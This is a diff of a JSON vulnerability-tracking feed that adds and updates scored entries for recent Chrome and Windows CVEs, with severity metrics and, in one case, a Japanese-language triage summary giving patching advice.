@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-10-26T15:33:11.752934+00:00",
+  "generated_at": "2026-10-26T19:59:36.444930+00:00",
   "items": [
     {
       "id": "JP-jpcert-at260034",
@@ -163,6 +163,56 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-113078",
+      "aliases": [],
+      "title": "",
+      "description": "Improper input validation in Compositing in Google Chrome prior to 156.0.8078.47 allowed a remote attacker to potentially execute arbitrary code outside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+      "published": "2026-10-20T22:18:59.383",
+      "updated": "2026-10-26T18:39:43.297",
+      "cvss": 9.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/499520020"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00412,
+      "epss_percentile": 0.35217,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 74.3,
+      "level": "critical",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 19.2,
+        "unauth_network": 5,
+        "rce": 5,
+        "tier1_critical": 15,
+        "epss": 0.1
+      },
+      "ai_analysis": "【状況】Google が 10/20 に Chrome 156 安定版で修正。画面合成（Compositing）処理での入力検証の不備。細工した HTML ページを開くと、サンドボックスの外で任意のコードを実行される恐れ。Google の重要度は「中」、CVSS は 9.6。悪用は確認されておらず（KEV 未掲載、EPSS 0.4%）、詳細情報は非公開。\n\n【原因の部品】Chromium（開発元 Google）。Chrome 以外に Edge・Brave・Opera などの Chromium 系ブラウザにも組み込まれている\n\n【影響範囲】\n・Chrome 156.0.8078.47 より前（Win/Mac/Linux）\n・Edge：156.0.4314.42（10/22）は出ているが、この脆弱性の修正が入っているかは未確認\n・Ubuntu の chromium-browser：対象外（snap 版をインストールするスクリプトのため）\n・Android 版、iOS 版、そのほかの Chromium 系製品：未確認\n\n【対応策】\n1. Chrome を 156.0.8078.47 以上（Win/Mac は .47 または .48）に更新して再起動。管理コンソールなどで全端末のバージョンを確認する。順次配信なので、手動または管理ツールで配信を早める\n2. Edge・Brave などは、各社の告知でこの CVE の修正を確認してから更新する。すぐ更新できない端末では、信頼できないサイトの閲覧を控える。回避策（設定変更など）は公表されておらず未確認\n\n【各告知の関係】\n・Google Chrome Releases：元の部品の修正（Chrome 156 で修正）\n・Chromium バグ 499520020：修正の追跡用で、内容は非公開\n・Ubuntu：配布物への影響判断（対象外）\n・Microsoft など組み込み製品の各社の告知：未確認\n・国内の注意喚起：見つかっていない\n\n【出典】\nhttps://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html\nhttps://ubuntu.com/security/CVE-2026-113078"
+    },
+    {
       "id": "CVE-2026-21589",
       "aliases": [],
       "title": "Atlassian Multiple Products Files or Directories Accessible to External Parties Vulnerability",
@@ -236,7 +286,7 @@
       "title": "Ahsay AhsayCBS Command Injection Vulnerability",
       "description": "A flaw has been found in Ahsay AhsayCBS up to 9.15.2.69/10.3.4.44. This vulnerability affects unknown code of the file /rps/api/json/UpdateReceivers.do of the component Replication Receiver. Executing a manipulation of the argument random can lead to os command injection. It is possible to launch the attack remotely. The exploit has been published and may be used. Upgrading to version 9.15.2.70 and 10.3.4.45 is able to resolve this issue. Upgrading the affected component is advised. The initial patch did not fix the security vulnerability properly. An update of the CVE entry to reflect this became necessary.",
       "published": "2026-10-04T07:16:33.480",
-      "updated": "2026-10-26T15:16:34.530",
+      "updated": "2026-10-26T18:06:57.930",
       "cvss": 10.0,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:A/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
@@ -587,12 +637,62 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-113076",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Toolbar in Google Chrome on on Android prior to 156.0.8078.47 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+      "published": "2026-10-20T22:18:59.163",
+      "updated": "2026-10-26T19:57:07.423",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/518068748"
+      ],
+      "exploit_ref": true,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00392,
+      "epss_percentile": 0.33098,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 62.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "exploit_ref": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-105133",
       "aliases": [],
       "title": "Ahsay AhsayCBS Improper Authentication Vulnerability",
       "description": "A vulnerability was detected in Ahsay AhsayCBS up to 9.15.2.69/10.3.4.44. This affects the function checkSysPwd of the file com/ahsay/obs/api/ApiStructsAction.java of the component API. Performing a manipulation of the argument random results in improper authentication. It is possible to initiate the attack remotely. The exploit is now public and may be used. Upgrading to version 9.15.2.70 and 10.3.4.45 is able to mitigate this issue. It is recommended to upgrade the affected component. The initial patch did not fix the security vulnerability properly. An update of the CVE entry to reflect this became necessary.",
       "published": "2026-10-04T07:16:33.087",
-      "updated": "2026-10-26T15:16:34.180",
+      "updated": "2026-10-26T18:07:09.000",
       "cvss": 6.9,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:A/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "medium",
@@ -648,11 +748,13 @@
       "title": "Collabora Online – Built-in CODE Server OS Command Injection Vulnerability",
       "description": "Collabora Online Built-in CODE Server before 26.4.303 (richdocumentscode), a Nextcloud app, allows remote code execution, as exploited in the wild in September and October 2026, a different vulnerability than CVE-2025-66208. This is an OS command injection in proxy.php when the CODE server isn't running (e.g., the product was recently restarted). The vulnerability is not present in standalone Collabora Online servers; only this deployment with CODE Server is affected.",
       "published": "2026-10-14T03:17:20.683",
-      "updated": "2026-10-26T12:01:31.130",
+      "updated": "2026-10-26T16:48:12.087",
       "cvss": 9.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
-      "cpes": [],
+      "cpes": [
+        "collabora:online"
+      ],
       "packages": [],
       "vendor_products": [
         "Collabora Collabora Online – Built-in CODE Server"
@@ -1478,6 +1580,153 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-113079",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in SiteIsolation in Google Chrome prior to 156.0.8078.47 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+      "published": "2026-10-20T22:18:59.493",
+      "updated": "2026-10-26T18:39:09.067",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/40055319"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00369,
+      "epss_percentile": 0.30535,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-113080",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in WebAppInstalls in Google Chrome prior to 156.0.8078.47 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Low)",
+      "published": "2026-10-20T22:18:59.600",
+      "updated": "2026-10-26T18:38:10.953",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/533135911"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00467,
+      "epss_percentile": 0.40172,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-113083",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in Actor in Google Chrome on on Android prior to 156.0.8078.47 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: Low)",
+      "published": "2026-10-20T22:18:59.940",
+      "updated": "2026-10-26T18:37:48.300",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/563337773"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00357,
+      "epss_percentile": 0.29204,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 57.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "rce": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-91765",
       "aliases": [],
       "title": "",
@@ -1582,6 +1831,123 @@
         "cvss": 19.6,
         "unauth_network": 5,
         "epss": 0.2
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69634",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Windows iSCSI allows an unauthorized attacker to execute code over a network.",
+      "published": "2026-10-13T19:18:56.343",
+      "updated": "2026-10-26T16:34:14.707",
+      "cvss": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69634"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.0097,
+      "epss_percentile": 0.61651,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 54.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 19.6,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69639",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Windows Libarchive allows an unauthorized attacker to execute code over a network.",
+      "published": "2026-10-13T19:18:56.713",
+      "updated": "2026-10-26T16:33:30.447",
+      "cvss": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69639"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.0097,
+      "epss_percentile": 0.61651,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 54.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 19.6,
+        "unauth_network": 5,
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -1818,6 +2184,55 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "2026-10-26T14:16:58.363768+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 53.0,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "exploit_ref": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-113077",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in Core in Google Chrome on on Mac prior to 156.0.8078.47 allowed a remote attacker to potentially read memory inside the sandbox via a crafted HTML page. (Chromium security severity: Medium)",
+      "published": "2026-10-20T22:18:59.273",
+      "updated": "2026-10-26T19:54:50.003",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/553159183"
+      ],
+      "exploit_ref": true,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00292,
+      "epss_percentile": 0.21532,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
       "matched": [
         "chrome"
       ],
@@ -2074,6 +2489,63 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-69985",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Windows Libarchive allows an unauthorized attacker to execute code over a network.",
+      "published": "2026-10-13T19:19:09.217",
+      "updated": "2026-10-26T17:24:28.470",
+      "cvss": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69985"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00816,
+      "epss_percentile": 0.56815,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 52.7,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 17.6,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-91766",
       "aliases": [],
       "title": "",
@@ -2278,6 +2750,246 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-105723",
+      "aliases": [],
+      "title": "",
+      "description": "Untrusted pointer dereference in Windows Distributed File System (DFS) allows an unauthorized attacker to elevate privileges over a network.",
+      "published": "2026-10-13T19:18:00.303",
+      "updated": "2026-10-26T17:22:37.913",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-105723"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.01301,
+      "epss_percentile": 0.70261,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 50.2,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.2
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-103558",
+      "aliases": [],
+      "title": "",
+      "description": "Deadlock in Windows Routing and Remote Access Service (RRAS) allows an unauthorized attacker to deny service over a network.",
+      "published": "2026-10-13T19:17:52.210",
+      "updated": "2026-10-26T16:31:32.020",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-103558"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00998,
+      "epss_percentile": 0.62521,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 50.1,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69976",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Remote Desktop Client allows an unauthorized attacker to execute code over a network.",
+      "published": "2026-10-13T19:19:08.240",
+      "updated": "2026-10-26T17:33:52.667",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69976"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00645,
+      "epss_percentile": 0.50636,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 50.1,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69984",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Remote Desktop Client allows an unauthorized attacker to execute code over a network.",
+      "published": "2026-10-13T19:19:09.030",
+      "updated": "2026-10-26T17:25:37.933",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69984"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00645,
+      "epss_percentile": 0.50636,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 50.1,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-114625",
       "aliases": [],
       "title": "Arista VeloCloud Orchestrator SQL Injection Vulnerability",
@@ -2328,6 +3040,65 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-59116",
+      "aliases": [],
+      "title": "",
+      "description": "Use of a broken or risky cryptographic algorithm in Windows Remote Desktop allows an unauthorized attacker to bypass a security feature over a network.",
+      "published": "2026-10-13T19:18:52.970",
+      "updated": "2026-10-26T16:48:09.683",
+      "cvss": 6.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-59116"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00413,
+      "epss_percentile": 0.35259,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 48.7,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.6,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2025-14181",
       "aliases": [],
       "title": "",
@@ -2362,6 +3133,120 @@
       "first_seen": "",
       "matched": [
         "php"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 48.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69968",
+      "aliases": [],
+      "title": "",
+      "description": "Relative path traversal in Windows Libarchive allows an unauthorized attacker to perform tampering over a network.",
+      "published": "2026-10-13T19:19:07.343",
+      "updated": "2026-10-26T18:06:22.983",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69968"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00875,
+      "epss_percentile": 0.58696,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
